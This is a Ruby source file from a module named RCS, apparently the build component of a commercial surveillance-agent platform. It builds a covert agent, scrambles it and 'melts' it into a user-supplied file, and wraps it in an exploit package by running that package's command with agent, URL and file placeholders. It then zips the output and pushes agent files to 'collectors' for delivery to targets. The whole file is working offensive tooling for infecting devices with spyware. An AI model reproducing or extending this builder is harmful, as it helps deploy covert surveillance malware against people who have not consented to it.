#
# Local exploit creation
#

require_relative '../frontend'
require_relative '../build'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildExploit < Build

  def initialize
    super
    @platform = 'exploit'
  end

  def load(params)
    trace :debug, "Build: load: #{params}"
    @factory = params['_id']
  end

  def unpack
    # nothing to unpack here
  end

  def build_agent(params)
    # build the agent for the right platform
    build = Build.factory(@exploit['platform'].to_sym)
    build.load({'_id' => @factory})
    build.unpack
    build.patch params['binary'].dup
    build.scramble
    build.melt params['melt'].dup
    agent = build.outputs.first
    FileUtils.cp(File.join(build.tmpdir, agent), path('agent'))
    @outputs = ['agent']
    build.clean
  end
  
  def generate(params)
    trace :debug, "Build: generate: #{params}"

    @exploit = Exploit.get params['exploit']

    raise "Exploit #{params['exploit']} not found" if @exploit.nil?

    build_agent params

    # unpack the exploit
    Zip::ZipFile.open(@exploit[:package]) do |z|
      z.each do |f|
        f_path = path(f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        z.extract(f, f_path) unless File.exist?(f_path)
      end
    end

  end

  def melt(params)
    trace :debug, "Build: melt #{params}"

    @appname = params['appname'] || 'exploit'

    # use the user-provided file to melt with
    if params['input']
      FileUtils.mv Config.instance.temp(params['input']), path('input')
    end
    
    FileUtils.mv path('agent'), path(@appname)
    @outputs.delete 'agent'
    @outputs.push @appname

    # TODO: prendere il primo format e' sbagliato...
    @appname_ext = @appname + '.' + @exploit['format'].first

    # invoke the creation of the exploit
    command = @exploit['exec']
    command.gsub!('%OUTPUT%', path(@appname_ext))
    command.gsub!('%AGENT%', path('agent'))
    command.gsub!('%URL%', params['url']) unless params['url'].nil?
    command.gsub!('%FILE%', path('input')) if File.exist?(path('input'))
    command.gsub!('%COMBO%', params['combo']) unless params['combo'].nil?

    # split the command and the arguments
    m = Regexp.new('([\w\.]+)(?: )(.*)', Regexp::IGNORECASE).match(command)
    command = m[1]
    # if the command is local, use the full path to the temp dir
    command = path(command) if File.exist? path(command)
    # on windows we have to invoke the interpreter explicitly
    command.prepend('ruby ') if command.end_with? '.rb'
    command.prepend('python ') if command.end_with? '.py'
    params = m[2]

    CrossPlatform.exec command, params, {:chdir => path('')}

    File.exist? path(@appname_ext) or raise("Exploit creation failed. No output file")

    @outputs << @appname_ext

  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open(@appname_ext, "w") { |f| f.write File.open(path(@appname_ext), 'rb') {|f| f.read} }
    end

    @outputs.insert(0, 'output.zip')
  end

  def deliver(params)
    trace :debug, "Build: deliver: #{params}"

    # if the agent was embedded, we don't need to push anything on the collector
    return if @exploit['embed']
    
    push = @outputs.dup
    push.delete 'output.zip'
    push.delete @appname_ext

    trace :info, "Build: delivering #{push}"
    
    # put them on the collectors
    push.each do |o|
      content = File.open(path(o), 'rb') {|f| f.read}
      Frontend.collector_put(o, content)
    end
  end

end

class Exploit
  extend RCS::Tracer

  class << self
    def reload_list
      list = []
      trace :debug, "Scanning Exploits..."

      begin
        exp_dir = File.join(Dir.pwd, 'exploits')
        if File.exist? exp_dir
          Dir[exp_dir + '/*.zip'].each do |exp|
            trace :debug, "loading: #{exp}"
            info = {}
            # load the info of each exploit from the package file
            Zip::ZipFile.open(exp) do |z|
              info = z.file.open('info.yaml', 'r') {|f| f.read}
              info = YAML.load(info)
            end
            # load only exploits with correct version number
            next unless info['version'] == 20120101
            info[:package] = exp
            list << info
          end
        end
      rescue Exception => e
        trace :error, "Cannot load exploit list: #{e.message}"
      end

      # atomic assignment to avoid concurrency
      @list = list
      
      trace :debug, "Exploit found: #{@list.size}"
    end

    def get(id)
      reload_list

      @list.each do |e|
        return e if e['id'] == id
      end
      
      return nil
    end

    def all
      reload_list
      @list
    end
    
  end

end

end #DB::
end #RCS::
